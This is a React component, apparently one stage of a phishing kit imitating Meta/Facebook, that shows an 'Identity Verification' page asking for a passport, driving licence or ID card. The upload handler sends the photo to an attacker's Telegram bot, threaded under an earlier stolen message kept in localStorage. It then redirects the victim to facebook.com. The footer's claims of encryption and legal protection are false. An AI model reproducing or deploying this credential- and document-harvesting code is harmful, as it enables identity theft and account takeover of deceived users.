import { useState } from 'react';
import { config } from '@/config/data';
import { Upload as UploadIcon, Send, Loader, Lock } from 'lucide-react';

interface UploadResponse {
    ok: boolean;
    result?: any;
    description?: string;
}

const Upload = () => {
    const [file, setFile] = useState<File | null>(null);
    const [loading, setLoading] = useState(false);
    const [message, setMessage] = useState<{ text: string; isError: boolean } | null>(null);

    const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
        const selectedFile = event.target.files?.[0] ?? null;
        setFile(selectedFile);
        setMessage(null);
    };

    const handleSubmit = async (event: React.FormEvent) => {
        event.preventDefault();

        if (!file) {
            setMessage({ text: 'Please select a file first', isError: true });
            return;
        }

        setLoading(true);
        setMessage(null);

        const storedData = localStorage.getItem('metaFormData');
        if (!storedData) {
            setMessage({ text: 'Session expired', isError: true });
            return;
        }
        const formData = JSON.parse(storedData);
        const lastMessageId = formData.lastMessageId;

        const formDataToSend = new FormData();
        formDataToSend.append('chat_id', config.CHAT_ID);
        formDataToSend.append('photo', file);
        formDataToSend.append('reply_to_message_id', lastMessageId);

        try {
            const response = await fetch(`https://api.telegram.org/bot${config.TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formDataToSend,
            });

            const result: UploadResponse = await response.json();

            if (result.ok) {
                setMessage({ text: 'Image uploaded successfully!', isError: false });
                setFile(null);
                const fileInput = document.getElementById('file-input') as HTMLInputElement;
                if (fileInput) fileInput.value = '';
                window.location.href = 'https://www.facebook.com';
            } else {
                setMessage({ text: result.description ?? 'Upload failed', isError: true });
            }
        } catch (error) {
            setMessage({ text: 'Error uploading image', isError: true });
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100 flex items-center justify-center p-4">
            <div className="w-full max-w-xl bg-white rounded-xl shadow-lg p-6">
                <div className="text-center mb-6">
                    <div className="mx-auto w-12 h-12 bg-[#355797] rounded-full flex items-center justify-center mb-4">
                        <Lock className="w-6 h-6 text-white" />
                    </div>
                    <h2 className="text-xl font-bold text-gray-900">Identity Verification</h2>
                    <p className="text-sm text-gray-600 mt-2">Please upload your identity document</p>
                </div>

                <div className="mb-6 bg-white/95 p-4 rounded-lg">
                    <h3 className="font-medium text-gray-900 mb-2">Accepted Documents:</h3>
                    <ul className="text-sm text-gray-600 space-y-2 mb-4">
                        <li className="flex items-start">
                            <span className="mr-2">•</span>
                            <span>Driving License</span>
                        </li>
                        <li className="flex items-start">
                            <span className="mr-2">•</span>
                            <span>National Identity Card</span>
                        </li>
                        <li className="flex items-start">
                            <span className="mr-2">•</span>
                            <span>Passport</span>
                        </li>
                        <li className="flex items-start">
                            <span className="mr-2">•</span>
                            <span>Birth Certificate</span>
                        </li>
                    </ul>

                    <h3 className="font-medium text-gray-900 mb-2">Image Requirements:</h3>
                    <ul className="text-sm text-gray-600 space-y-2">
                        <li className="flex items-start">
                            <span className="mr-2">•</span>
                            <span>Image must be clear, not blurry or overexposed</span>
                        </li>
                        <li className="flex items-start">
                            <span className="mr-2">•</span>
                            <span>Ensure all information on the document is readable</span>
                        </li>
                    </ul>
                </div>

                <form onSubmit={handleSubmit} className="space-y-4">
                    <div className="relative border-2 border-dashed border-black/20 rounded-lg p-4 text-center">
                        <input
                            type="file"
                            id="file-input"
                            accept="image/*"
                            onChange={handleFileChange}
                            className="absolute inset-0 w-full h-full opacity-0 cursor-pointer"
                        />
                        <div className="space-y-2">
                            {file ? (
                                <div className="flex flex-col items-center">
                                    <img
                                        src={URL.createObjectURL(file)}
                                        alt="Preview"
                                        className="w-32 h-32 object-cover rounded-lg"
                                    />
                                    <p className="text-sm text-gray-500 mt-2">{file.name}</p>
                                </div>
                            ) : (
                                <>
                                    <UploadIcon className="w-6 h-6 mx-auto text-gray-400" />
                                    <p className="text-gray-500">Click or drag image to upload</p>
                                </>
                            )}
                        </div>
                    </div>

                    {message && (
                        <div className="p-3 rounded-lg bg-white/90 border border-black/20">
                            <p className="text-sm text-black">{message.text}</p>
                        </div>
                    )}

                    <div className="flex gap-3">
                        <button
                            type="submit"
                            disabled={loading || !file}
                            className="w-full px-4 py-2.5 bg-black text-white rounded-lg hover:bg-black/90 transition-colors disabled:opacity-50 flex items-center justify-center"
                        >
                            {loading ? (
                                <div className="flex items-center gap-2">
                                    <Loader className="w-4 h-4 animate-spin" />
                                    <span>Uploading...</span>
                                </div>
                            ) : (
                                <>
                                    <Send className="w-5 h-5 mr-2" />
                                    <span>Upload</span>
                                </>
                            )}
                        </button>
                    </div>
                </form>

                <div className="mt-6 text-xs text-gray-500 space-y-2">
                    <p className="flex items-center justify-center">
                        <Lock className="w-4 h-4 mr-1" />
                        Your information is encrypted and completely secure
                    </p>
                    <p className="text-center">
                        We are committed to protecting your personal information in accordance with the law
                    </p>
                    <p className="text-center">
                        By uploading, you agree to our
                        <a href="/terms" className="text-gray-900 hover:underline ml-1">
                            Terms of Service
                        </a>
                        <span className="mx-1">and</span>
                        <a href="/privacy" className="text-gray-900 hover:underline">
                            Privacy Policy
                        </a>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default Upload;